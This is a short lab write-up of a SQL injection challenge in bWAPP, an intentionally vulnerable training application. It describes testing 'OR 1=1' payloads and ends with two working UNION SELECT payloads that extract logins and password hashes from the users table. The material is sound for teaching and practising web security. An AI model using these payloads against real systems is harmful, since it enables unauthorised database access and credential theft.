# Introduction
---

The Buggy Web Application (BWAPP) offers a set of challenges based on the ***SQL Injection vulnerability***. (**A03:2021 - Injection**)

***SECURITY LEVELS COVERED***
- Low

# Target
---

# Functionality
---

The application allows us to choose a movie from the list provided:

![[images/SqliGetSelectFunction.png]]

### Probable SQL query:

```SQL
SELECT * FROM movies WHERE id="$variable"
```

# Exploitation
---

Testing with standard payload `1' OR 1=1 -- ` returned an error, yet the `1 OR 1=1 -- ` didn't fail:

![[images/SqliGetSelectTest.png]]

Passing a `UNION` based payload earlier used in [[19.09.2025/SQL Injection (GET Search)/README.en]] didn't return any errors, yet did not allow to retrieve any information from the (likely) users table:

![[images/SqlietGetSelectTest2.png]]

Passing `UNION` based payloads with `ORDER BY` additions allowed to retrieve data from the `users` table by modifying the `ORDER BY` parameter:

## Final payloads

Retrieving hashed password entries:

```SQL

1 UNION SELECT login, password, NULL, NULL, NULL, NULL, NULL FROM users ORDER BY 2 --
 
```

Retrieving login entries:

```SQL

1 UNION SELECT password, login, NULL, NULL, NULL, NULL, NULL FROM users ORDER BY 2 --
 
```
